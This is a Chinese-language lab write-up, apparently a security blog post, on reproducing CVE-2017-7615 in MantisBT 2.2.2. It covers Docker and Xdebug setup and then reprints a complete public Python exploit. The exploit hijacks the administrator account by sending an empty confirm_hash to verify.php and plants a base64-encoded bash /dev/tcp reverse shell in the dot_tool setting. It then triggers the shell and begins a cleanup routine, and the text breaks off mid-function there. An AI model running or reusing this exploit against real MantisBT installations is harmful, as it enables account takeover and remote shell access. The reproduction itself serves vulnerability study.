<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="8e1757e2ee641011bce4b7e7c37d233d">概述</h2>
<p>Mantis BT是一个BUG管理系统,用php编写，系统相对简单轻量级，开源。</p>
<p>CVE-2017-7615漏洞影响MantisBT2.3.0及之前的版本，攻击者可通过向verify.php文件传递空的<code>confirm_hash</code>值利用该漏洞重置任意密码，获取管理员访问权限。</p>
<h2 data-content="1" id="4ce1cb0df56f58b8b820f0bd93557c95">环境搭建</h2>
<p>启动一个docker</p>
<div class="highlight"><pre><span></span>sudo docker run -it --name Mantis -p <span class="m">10080</span>:80 --privileged<span class="o">=</span><span class="nb">true</span> -v /home/island/work/work/software/Mantis/container:/root ubuntu:16.04 bash
</pre></div>
<p>进入docker先安装最基础的一些工具</p>
<div class="highlight"><pre><span></span>apt-get update
apt-get install net-tools 
apt-get install iputils-ping
apt-get install iproute2
apt-get install vim
apt-get install zip
</pre></div>
<p>安装Mantis</p>
<div class="highlight"><pre><span></span>apt-get install apache2
apt-get install php
apt-get install php7.0-gd <span class="o">(</span>php用你的特定版本<span class="o">)</span>
apt-get install libapache2-mod-php
apt-get install mysql-server
apt-get install php-mysql
apt-get install php-xml
apt-get install php-mbstring
service apache2 start
service mysql start
</pre></div>
<p>从GitHub上可以下载到2.18.0的Mantis的安装包<a href="https://github.com/mantisbt/mantisbt/tree/release-2.18.0,然后进行安装" target="_blank">https://github.com/mantisbt/mantisbt/tree/release-2.18.0,然后进行安装</a></p>
<pre><code>cp  mantisbt-2.18.0.zip  /var/www/html/
cd  /var/www/html/
unzip mantisbt-2.18.0.zip
mv mantisbt-2.18.0 mantisbt
chmod -R 777 mantisbt</code></pre>
<p>修改配置文件，将/etc/php/7.0/apache2/php.ini其中<code>;extension=msql.so</code>前边的分号删除</p>
<p>修改文件/etc/apache2/apache2.conf，在最后加上一行<code>ServerName localhost:80</code></p>
<p>在访问目标80端口时候发现不能正常访问，查看apache2日志</p>
<div class="highlight"><pre><span></span>root@21467ebf0ffb:/var/www/html/mantisbt# tail /var/log/apache2/error.log
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:04.072922 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12525</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56529<span class="o">]</span> PHP Warning:  require_once<span class="o">(</span>/var/www/html/mantisbt/vendor/autoload.php<span class="o">)</span>: failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:04.072952 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12525</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56529<span class="o">]</span> PHP Fatal error:  require_once<span class="o">()</span>: Failed opening required <span class="s1">'/var/www/html/mantisbt/vendor/autoload.php'</span> <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/share/php'</span><span class="o">)</span> in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:07.553159 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12533</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56558<span class="o">]</span> PHP Warning:  require_once<span class="o">(</span>/var/www/html/mantisbt/vendor/autoload.php<span class="o">)</span>: failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:07.553188 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12533</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56558<span class="o">]</span> PHP Fatal error:  require_once<span class="o">()</span>: Failed opening required <span class="s1">'/var/www/html/mantisbt/vendor/autoload.php'</span> <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/share/php'</span><span class="o">)</span> in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:08.132794 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12526</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56559<span class="o">]</span> PHP Warning:  require_once<span class="o">(</span>/var/www/html/mantisbt/vendor/autoload.php<span class="o">)</span>: failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:08.132822 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12526</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56559<span class="o">]</span> PHP Fatal error:  require_once<span class="o">()</span>: Failed opening required <span class="s1">'/var/www/html/mantisbt/vendor/autoload.php'</span> <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/share/php'</span><span class="o">)</span> in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:08.335108 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12527</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56560<span class="o">]</span> PHP Warning:  require_once<span class="o">(</span>/var/www/html/mantisbt/vendor/autoload.php<span class="o">)</span>: failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:08.335137 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12527</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56560<span class="o">]</span> PHP Fatal error:  require_once<span class="o">()</span>: Failed opening required <span class="s1">'/var/www/html/mantisbt/vendor/autoload.php'</span> <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/share/php'</span><span class="o">)</span> in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:08.497536 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12528</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56561<span class="o">]</span> PHP Warning:  require_once<span class="o">(</span>/var/www/html/mantisbt/vendor/autoload.php<span class="o">)</span>: failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
<span class="o">[</span>Tue Jul <span class="m">26</span> <span class="m">09</span>:30:08.497565 <span class="m">2022</span><span class="o">]</span> <span class="o">[</span>:error<span class="o">]</span> <span class="o">[</span>pid <span class="m">12528</span><span class="o">]</span> <span class="o">[</span>client <span class="m">172</span>.16.113.1:56561<span class="o">]</span> PHP Fatal error:  require_once<span class="o">()</span>: Failed opening required <span class="s1">'/var/www/html/mantisbt/vendor/autoload.php'</span> <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/share/php'</span><span class="o">)</span> in /var/www/html/mantisbt/core.php on line <span class="m">91</span>
</pre></div>
<p>查了一下，在mantisbt目录下执行以下命令配置一下环境，安装依赖：</p>
<pre><code>composer dump-autoload
apt-get install php7.0-gd
composer install</code></pre>
<p>然后访问<code>http://172.16.113.160:10080/mantisbt/admin/install.php</code>页面进行傻瓜式安装</p>
<p>安装完成后访问<a href="http://172.16.113.160:10080/mantisbt即可进入登陆界面，登陆账号administrator，密码root" target="_blank">http://172.16.113.160:10080/mantisbt即可进入登陆界面，登陆账号administrator，密码root</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220728172847-aeed3bd8-0e57-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220728172855-b35d9d5c-0e57-1.png"/></p>
<h2 data-content="1" id="acf4d8a6b2494d9f378186a0ae991419">调试环境搭建</h2>
<p>这个洞和我安装的版本不太适配，为了进行调试，同样的方法下载安装mantisBT 2.2.2,下载github里面的发现有点问题，建议可以去<a href="https://sourceforge.net/projects/mantisbt/下载" target="_blank">https://sourceforge.net/projects/mantisbt/下载</a></p>
<p>下载解压完成后放在web目录下安装</p>
<div class="highlight"><pre><span></span>cp -r /root/mantisbt-2.2.2/ /var/www/html/
chmod -R <span class="m">777</span> mantisbt-2.2.2/
</pre></div>
<p>另外为了方便调试，利用vscode+xdebug实现php的远程调试，记录一下配置记录</p>
<h3 data-content="1" id="a7521c76a97cf19ca2ffc79246d89b93">服务器端配置</h3>
<div class="highlight"><pre><span></span>apt install php-xdebug
</pre></div>
<p>然后通过命令<code>php --ini | more</code>可以知道php.ini文件的位置在<code>/etc/php/7.0/cli/php.ini</code>，打开在末尾增加以下内容</p>
<div class="highlight"><pre><span></span><span class="o">[</span>xdebug<span class="o">]</span>
<span class="nv">zend_extension</span><span class="o">=</span>xdebug.so
<span class="o">[</span>XDebug<span class="o">]</span>
xdebug.remote_enable <span class="o">=</span> on
xdebug.remote_autostart <span class="o">=</span> <span class="m">1</span>
xdebug.remote_host <span class="o">=</span> <span class="m">172</span>.16.113.1
xdebug.remote_port <span class="o">=</span> <span class="m">9000</span>
xdebug.remote_connect_back <span class="o">=</span> <span class="m">0</span>
xdebug.auto_trace <span class="o">=</span> <span class="m">1</span>
xdebug.collect_includes <span class="o">=</span> <span class="m">1</span>
xdebug.collect_params <span class="o">=</span> <span class="m">1</span>
xdebug.remote_log <span class="o">=</span> /tmp/xdebug.log
</pre></div>
<h3 data-content="1" id="c6a0bea98f747fff5c7c5fa73032bd3f">主机端配置</h3>
<p>我的主机IDE端是Mac+VScode</p>
<p>Mac自带php，且php自带xdebug组件不用重复安装</p>
<p>直接打开VScode,打开调试界面，会自动添加launch.json,编辑加入以下内容</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="err">//</span> <span class="err">Use</span> <span class="err">IntelliSense</span> <span class="err">to</span> <span class="err">learn</span> <span class="err">about</span> <span class="err">possible</span> <span class="err">attributes.</span>
    <span class="err">//</span> <span class="err">Hover</span> <span class="err">to</span> <span class="err">view</span> <span class="err">descriptions</span> <span class="err">of</span> <span class="err">existing</span> <span class="err">attributes.</span>
    <span class="err">//</span> <span class="err">For</span> <span class="err">more</span> <span class="err">information,</span> <span class="err">visit:</span> <span class="err">https://go.microsoft.com/fwlink/?linkid=830387</span>
    <span class="nt">"version"</span><span class="p">:</span> <span class="s2">"0.2.0"</span><span class="p">,</span>
    <span class="nt">"configurations"</span><span class="p">:</span> <span class="p">[</span>
        <span class="p">{</span>
            <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"Listen for XDebug"</span><span class="p">,</span>
            <span class="nt">"type"</span><span class="p">:</span> <span class="s2">"php"</span><span class="p">,</span>
            <span class="nt">"request"</span><span class="p">:</span> <span class="s2">"launch"</span><span class="p">,</span>
            <span class="nt">"stopOnEntry"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
            <span class="nt">"localSourceRoot"</span><span class="p">:</span> <span class="s2">"/Users/islandmac/Seafile/MyDocument/work/software/Mantis/container/mantisbt-2.2.2/"</span><span class="p">,</span>
            <span class="nt">"serverSourceRoot"</span><span class="p">:</span> <span class="s2">"/var/www/html/mantisbt-2.2.2/"</span><span class="p">,</span>
            <span class="nt">"port"</span><span class="p">:</span> <span class="mi">9000</span>
        <span class="p">},</span>
        <span class="p">{</span>
            <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"Launch currently open script"</span><span class="p">,</span>
            <span class="nt">"type"</span><span class="p">:</span> <span class="s2">"php"</span><span class="p">,</span>
            <span class="nt">"request"</span><span class="p">:</span> <span class="s2">"launch"</span><span class="p">,</span>
            <span class="nt">"program"</span><span class="p">:</span> <span class="s2">"${file}"</span><span class="p">,</span>
            <span class="nt">"cwd"</span><span class="p">:</span> <span class="s2">"${fileDirname}"</span><span class="p">,</span>
            <span class="nt">"port"</span><span class="p">:</span> <span class="mi">9000</span>
        <span class="p">}</span>
    <span class="p">]</span>
<span class="p">}</span>
</pre></div>
<h3 data-content="1" id="aa2a13187b24aae50def45aa9afc459d">调试环境测试</h3>
<p>至此，调试环境搭建完成，在verify.php头部下一个断点</p>
<p>尝试访问，发现果然断下来了，证明调试环境搭建成功</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220728172907-ba7f7146-0e57-1.png"/></p>
<h2 data-content="1" id="bc458c20abb109a3c04c36c1e1538ac1">漏洞复现</h2>
<p><a href="https://disk.scan.cm/All_wiki/yougar0.github.io%28%E5%9F%BA%E4%BA%8E%E9%9B%B6%E7%BB%84%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E5%BA%93%20%2B%20PeiQi%E6%96%87%E5%BA%93%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%29-20210715/Web%E5%AE%89%E5%85%A8/MantisBT/%EF%BC%88CVE-2017-7615%EF%BC%89MantisBT%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md?hash=zE0KEPGJ" target="_blank">exp</a>已经有大佬在网上放出来了</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote_plus</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">from</span> <span class="nn">re</span> <span class="kn">import</span> <span class="n">split</span>

<span class="k">class</span> <span class="nc">exploit</span><span class="p">():</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>  <span class="c1"># Initialize the headers dictionary</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">"192.168.1.10"</span>  <span class="c1"># Victim IP</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">=</span> <span class="s2">"10080"</span>  <span class="c1"># Victim port</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">LHOST</span> <span class="o">=</span> <span class="s2">"192.168.1.10"</span>  <span class="c1"># Attacker IP</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">LPORT</span> <span class="o">=</span> <span class="s2">"4444"</span>  <span class="c1"># Attacker Port</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">verify_user_id</span> <span class="o">=</span> <span class="s2">"1"</span>  <span class="c1"># User id for the target account</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">realname</span> <span class="o">=</span> <span class="s2">"administrator"</span>  <span class="c1"># Username to hijack</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">passwd</span> <span class="o">=</span> <span class="s2">"password"</span>  <span class="c1"># New password after account hijack</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">=</span> <span class="s2">"/mantisbt-2.2.2"</span>  <span class="c1"># Location of mantis in URL</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ReverseShell</span> <span class="o">=</span> <span class="s2">"echo "</span> <span class="o">+</span> <span class="n">b64encode</span><span class="p">(</span>
            <span class="s2">"bash -i &gt;&amp; /dev/tcp/"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">LHOST</span> <span class="o">+</span> <span class="s2">"/"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">LPORT</span> <span class="o">+</span> <span class="s2">" 0&gt;&amp;1"</span><span class="p">)</span> <span class="o">+</span> <span class="s2">" | base64 -d | /bin/bash"</span>  <span class="c1"># Reverse shell payload</span>

    <span class="k">def</span> <span class="nf">reset_login</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># Request # 1: Grab the account update token</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://'</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s1">'/verify.php?id='</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">verify_user_id</span> <span class="o">+</span> <span class="s1">'&amp;confirm_hash='</span>
        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
            <span class="k">print</span> <span class="s2">"ERROR: Unable to access password reset page"</span>
            <span class="nb">exit</span><span class="p">()</span>

        <span class="n">account_update_token</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'name="account_update_token" value='</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

        <span class="c1"># Request # 2: Reset the account password</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://'</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s1">'/account_update.php'</span>
        <span class="n">data</span> <span class="o">=</span> <span class="s2">"account_update_token="</span> <span class="o">+</span> <span class="n">account_update_token</span> <span class="o">+</span> <span class="s2">"&amp;password="</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwd</span> <span class="o">+</span> <span class="s2">"&amp;verify_user_id="</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">verify_user_id</span> <span class="o">+</span> <span class="s2">"&amp;realname="</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">realname</span> <span class="o">+</span> <span class="s2">"&amp;password_confirm="</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwd</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">'Content-Type'</span><span class="p">:</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">})</span>
        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="k">print</span> <span class="s2">"Successfully hijacked account!"</span>

    <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="s2">"return=index.php&amp;username="</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">realname</span> <span class="o">+</span> <span class="s2">"&amp;password="</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwd</span> <span class="o">+</span> <span class="s2">"&amp;secure_session=on"</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://'</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s1">'/login.php'</span>

        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="s2">"login_page.php"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">url</span><span class="p">:</span>
            <span class="k">print</span> <span class="s2">"Successfully logged in!"</span>

    <span class="k">def</span> <span class="nf">CreateConfigOption</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">option</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="c1"># Get adm_config_set_token</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://'</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s1">'/adm_config_report.php'</span>
        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>

        <span class="n">adm_config_set_token</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'name="adm_config_set_token" value='</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

        <span class="c1"># Create config</span>
        <span class="n">data</span> <span class="o">=</span> <span class="s2">"adm_config_set_token="</span> <span class="o">+</span> <span class="n">adm_config_set_token</span> <span class="o">+</span> <span class="s2">"&amp;user_id=0&amp;original_user_id=0&amp;project_id=0&amp;original_project_id=0&amp;config_option="</span> <span class="o">+</span> <span class="n">option</span> <span class="o">+</span> <span class="s2">"&amp;original_config_option=&amp;type=0&amp;value="</span> <span class="o">+</span> <span class="n">quote_plus</span><span class="p">(</span>
            <span class="n">value</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"&amp;action=create&amp;config_set=Create+Configuration+Option"</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://'</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s1">'/adm_config_set.php'</span>
        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">TriggerExploit</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span> <span class="s2">"Triggering reverse shell"</span>

        <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://'</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s1">'/workflow_graph_img.php'</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>

    <span class="k">def</span> <span class="nf">Cleanup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># Delete the config settings that were created to send the reverse shell</span>
        <span class="k">print</span> <span class="s2">"Cleaning up"</span>

        <span class="n">cleaned_up</span> <span class="o">=</span> <span class="bp">False</span>

        <span class="n">cleanup</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

        <span class="n">CleanupHeaders</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
        <span class="n">CleanupHeaders</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">'Content-Type'</span><span class="p">:</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">})</span>

        <span class="n">data</span> <span class="o">=</span> <span class="s2">"return=index.php&amp;username="</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">realname</span> <span class="o">+</span> <span class="s2">"&amp;password="</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwd</span> <span class="o">+</span> <span class="s2">"&amp;secure_session=on"</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://'</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s1">'/login.php'</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">cleanup</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">CleanupHeaders</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

        <span class="n">ConfigsToCleanup</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'dot_tool'</span><span class="p">,</span> <span class="s1">'relationship_graph_enable'</span><span class="p">]</span>

        <span class="k">for</span> <span class="n">config</span> <span class="ow">in</span> <span class="n">ConfigsToCleanup</span><span class="p">:</span>
            <span class="c1"># Get adm_config_delete_token</span>
            <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s2">"/adm_config_report.php"</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">cleanup</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
            <span class="n">test</span> <span class="o">=</span> <span class="n">split</span><span class="p">(</span><span class="s1">'&lt;!-- Repeated Info Rows --&gt;'</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

            <span class="c1"># First element of the response list is garbage, delete it</span>
            <span class="k">del</span> <span class="n">test</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

            <span class="n">cleanup_dict</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">test</span><span class="p">)):</span>
                <span class="k">if</span> <span class="n">config</span> <span class="ow">in</span> <span class="n">test</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
